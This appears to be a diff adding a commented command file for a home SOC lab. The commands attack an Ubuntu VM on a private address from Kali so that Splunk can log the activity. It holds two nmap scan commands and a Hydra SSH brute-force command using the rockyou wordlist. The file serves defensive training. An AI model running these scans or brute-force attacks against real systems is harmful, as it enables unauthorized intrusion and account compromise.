@@ -1,0 +1,33 @@
+# ==============================
+# SOC LAB - ATTACK COMMANDS
+# ==============================
+
+# Target: Ubuntu Server (Victim)
+# Attacker: Kali Linux
+# Purpose: Simulate attacks for SOC monitoring in Splunk
+
+
+# ------------------------------
+# 1. Network Reconnaissance (Nmap Scan)
+# ------------------------------
+
+# Basic port scan
+nmap -sS 192.168.56.102
+
+# Service and version detection
+nmap -A 192.168.56.102
+
+# Purpose:
+# Identify open ports and services running on the target.
+
+
+# ------------------------------
+# 2. SSH Brute Force Attack
+# ------------------------------
+
+# Using Hydra to brute-force SSH login
+hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
+
+# Purpose:
+# Simulate brute-force attack to generate failed login logs in /var/log/auth.log
+
